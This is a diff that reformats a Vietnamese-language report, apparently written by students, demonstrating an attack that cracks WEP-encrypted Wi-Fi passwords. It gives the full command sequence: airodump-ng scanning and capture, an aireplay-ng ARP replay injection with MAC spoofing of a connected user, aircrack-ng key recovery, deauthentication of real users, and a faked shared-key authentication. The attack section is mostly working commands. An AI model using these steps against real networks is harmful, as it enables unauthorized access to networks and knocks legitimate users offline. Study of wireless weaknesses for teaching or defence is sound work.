@@ -151,31 +151,34 @@ Demo is available on Youtube:
 Trong báo cáo này, nhóm chúng em sẽ thực hiện demo một cuộc tấn công crack pass wifi được mã hóa WEP. Báo cáo sẽ trình bày quy trình tấn công cũng như chức năng các tool được sử dụng trong từng bước của quy trình tấn công.
 
 ### **1. Cấu hình phần cứng/mềm**
-* OS: Kali Linux 2020.2
-* Kernel version: SMP Debian 5.6.14-1kali1 (2020-05-25)
-* RAM: 8Gb
-* CPU: Intel® Core™ i7-9750H Processor
-* Wireless Card: TL-WN722N  V3.
+**OS:** Kali Linux 2020.2
+**Kernel version:** SMP Debian 5.6.14-1kali1 (2020-05-25)
+**RAM:** 8Gb
+**CPU:** Intel® Core™ i7-9750H Processor
+**Wireless Card:** TL-WN722N  V3.
 ### **2. Tool sử dụng**
-* airodump-ng
-* aireplay-ng
-* aircrack-ng
-* besside-ng
+```
+airodump-ng, aireplay-ng, aircrack-ng, besside-ng
+```
 ### **3. Quy trình tấn công**
-* Thiết lập môi trường.
-* Scan mạng để xác định các thông số của mục tiêu.
-* Theo dõi, bắt các gói tin tới mục tiêu. Gửi các gói tin fake tới mục tiêu để đẩy nhanh quá trình thu nhập data.
-* Khi đã thu nhập "đủ" data, dừng theo dõi mục tiêu và bắt đầu crack pass từ những data đã thu nhập.
+**Step 1:** Thiết lập môi trường.
+**Step 2:** Scan mạng để xác định các thông số của mục tiêu.
+**Step 3:** Theo dõi, bắt các gói tin tới mục tiêu. Gửi các gói tin fake tới mục tiêu để đẩy nhanh quá trình thu nhập data.
+**Step 4:** Khi đã thu nhập "đủ" data, dừng theo dõi mục tiêu và bắt đầu crack pass từ những data đã thu nhập.
 
-**Lưu ý**: quy trình trên áp dụng cho tấn công mạng WEP-OpenKey, đối với WEP-ShareKey, chúng ta có thể thực hiện dễ dàng hơn theo quy trình được đề cập cuối report.
+**Lưu ý:** quy trình trên áp dụng cho tấn công mạng WEP-OpenKey, đối với WEP-ShareKey, chúng ta có thể thực hiện dễ dàng hơn theo quy trình được đề cập cuối report.
 ### **4. Thiết lập môi trường tấn công**
-> **ifconfig && iwconfig**
+```
+ifconfig && iwconfig
+```
 
 Kiểm tra các interface cũng như card mạng vẫn hoạt động.
-> **ifconfig wlan0 down
+```
+ifconfig wlan0 down
 airmon-ng check kill
 iwconfig wlan0 mode monitor
-ifconfig wlan0 up**
+ifconfig wlan0 up
+```
 
 Chuyển wireless card của chúng ta sang chế độ monitor.
 ### **5. Scan mạng và bắt gói tin: Airodump-ng**
@@ -183,15 +186,21 @@ Chuyển wireless card của chúng ta sang chế độ monitor.
 [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng) được sử dụng để bắt các packet của 802.11 frames. Tool này phù hợp để bắt các WEP [IVs](http://en.wikipedia.org/wiki/Initialization_vector "http://en.wikipedia.org/wiki/Initialization_vector") (Initialization Vector) để sau đó có thể crack pass bằng tool [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng "aircrack-ng"). 
 Trong báo cáo này, nhóm sẽ sử dụng Airodump-ng để xác định các thông số của mục tiêu cũng như dùng để bắt các gói tin. Nhóm sẽ xác định Network's bssid, ssid và channel của mục tiêu.
 Dùng lệnh:
-> **airodump-ng wlan0**
+```
+airodump-ng wlan0
+```
 
 Hoặc
->  **airodump-ng wlan0 --encrypt wep**
+```
+airodump-ng wlan0 --encrypt wep
+```
 
 Trong đó **"wlan0"** là interface chúng ta đã chuyển sang monitor mode từ bước trước. Option  **"--encrypt wep"** xác định chúng ta sẽ chỉ scan các mạng được mã hóa bằng WEP.
 ![Airodump.png](https://www.upsieutoc.com/images/2020/06/16/Airodump.png)
 
->**airodump-ng --bssid E8:94:F6:3C:2D:D8 --channel 6 --write wepcracking wlan0**
+```
+airodump-ng --bssid E8:94:F6:3C:2D:D8 --channel 6 --write wepcracking wlan0
+```
 
 Tiếp tục, **airodump-ng** sẽ tập trung theo dõi mạng có  bssid = E8:94:F6:3C:2D:D8 (bssid của mục tiêu). Option **" --write < prefix >"** sẽ dump các packet vào file có **< prefix >**.
 [![Airodump_capDATA.png](https://www.upsieutoc.com/images/2020/06/16/Airodump_capDATA.png)](https://www.upsieutoc.com/image/fdT180)
@@ -201,14 +210,18 @@ Hãy chú ý tới trường **"#Data"**, đây chính là số lượng các g�
 ### **6. Fake gói tin, tăng tốc độ thu nhập data: Aireplay-ng** 
 [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) chủ yếu dùng để inject frames, tạo trafic hỗ trợ **aircrack-ng** trong việc crack WEP và WPA-PSK keys. Có rất nhiều option tấn công có thể xem trong document, nhưng ở report này, chúng ta chỉ sử dụng [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection "arp-request_reinjection").
 
->**aireplay-ng -3 -b E8:94:F6:3C:2D:D8 wlan0**
+```
+aireplay-ng -3 -b E8:94:F6:3C:2D:D8 wlan0
+```
 
 Trong đó **"-3"** là option ARP replay attack, **"-b"** là option chọn bssid mục tiêu.
 [![ReplayARP.png](https://www.upsieutoc.com/images/2020/06/17/ReplayARP.png)](https://www.upsieutoc.com/image/frJe2r)
 Có thể thấy như trên ảnh,  *Aireplay-ng* sẽ liên tục gửi các gói tin ARP, giúp tăng tốc độ thu nhập **data** của airodump-ng.
 
 Trong trường hợp, khi AP lock địa chỉ Mac máy bạn, có thể thử bằng cách
->**aireplay-ng -3 -b < bssid MAC address> -h < source MAC address> wlan0**
+```
+aireplay-ng -3 -b < bssid MAC address> -h < source MAC address> wlan0
+```
 
 Trong đó, hay thay thế source MAC addr bằng MAC addr của một user đang kết nối với AP đó.
 ### **7. Crack WEP: Aircrack-ng** 
@@ -217,7 +230,9 @@ Trong đó, hay thay thế source MAC addr bằng MAC addr của một user đan
 Aircrack-ng xác định khóa WEP bằng hai phương thức cơ bản. Phương pháp đầu tiên là PTW (Pyshkin, Tews, Weinmann), phương pháp này được thực hiện trong hai bước. Trong bước đầu, aircrack-ng chỉ sử dụng các gói ARP. Nếu không tìm thấy khóa, thì nó sử dụng tất cả các gói trong các gói tin ta bắt được. Một hạn chế quan trọng là cuộc tấn công PTW hiện chỉ có thể bẻ khóa các khóa WEP 40 và 104 bit. Ưu điểm chính của phương pháp PTW là rất ít gói dữ liệu được yêu cầu để bẻ khóa WEP.
 
 Phương pháp khác, cũ hơn là phương pháp FMS / KoreK. Phương pháp FMS / KoreK kết hợp các cuộc tấn công thống kê khác nhau để khám phá khóa WEP và sử dụng kết hợp với brute force. Nó đòi hỏi nhiều gói hơn PTW, nhưng mặt khác có thể khôi phục cụm mật khẩu khi PTW đôi khi không thành công.
->**aircrack-ng wepcracking-01.cap**
+```
+aircrack-ng wepcracking-01.cap
+```
 
 Đối với bản demo trong report này, ta cần truyền vào file chứa các packet mà ta đã dump được từ Airodump-ng. và tận hưởng thành quả.
 
@@ -231,18 +246,24 @@ Vấn đề bảo mật ở đây, kẻ tấn công có thể nghe lén việc t
 **Quy trình crack:**
 Đầu tiên ta cũng phải setup môi trường và scan mạng để chuẩn bị tấn công.
 Sau đó bắt đầu theo dõi để bắt được các gói tin challenge.
- >**airodump-ng wlan0 -c < target's chanel > --bssid <target's bssid> -w keystream**
-
+```
+airodump-ng wlan0 -c < target's chanel > --bssid <target's bssid> -w keystream
+```
 [![KeyStreamCreate.md.png](https://www.upsieutoc.com/images/2020/06/17/KeyStreamCreate.md.png)](https://www.upsieutoc.com/image/frF70s)
 Send gói tin deauthen để bắt các user phải đăng nhập lại để ta có thể bắt được các gói tin challenge. Sau khi người dùng đăng nhập lại, airodump-ng sẽ bắt được gói tin SKA.
- >**aireplay-ng --deauth 0 -a <target's bssid> -c  < true user MAC >  wlan0**
-
+```
+aireplay-ng --deauth 0 -a <target's bssid> -c  < true user MAC >  wlan0
+```
 [![Deauthen.png](https://www.upsieutoc.com/images/2020/06/17/Deauthen.png)](https://www.upsieutoc.com/image/frFmc1)
 * Setup interface sang chanel của target.
->**iwconfig wlan0 channel < target's chanel >**
+```
+iwconfig wlan0 channel < target's chanel >
+```
 * Bắt đầu gửi gói tin challenge fake.
->**aireplay-ng -1 0 -e  < target's essid >  -y keystream-01-E8-94-F6-3C-2D-D8.xor -a <target's bssid> -h < Mac fake > wlan0**
-
+```
+aireplay-ng -1 0 -e  < target's essid >  -y keystream-01-E8-94-F6-3C-2D-D8.xor -a <target's bssid> -h < Mac fake > wlan0
+```
 **Khi thành công chúng ta sẽ có thể truy cập Access Point như bình thường.**
+
 [![FakeSKA.png](https://www.upsieutoc.com/images/2020/06/17/FakeSKA.png)](https://www.upsieutoc.com/image/frF6QO)
 ---
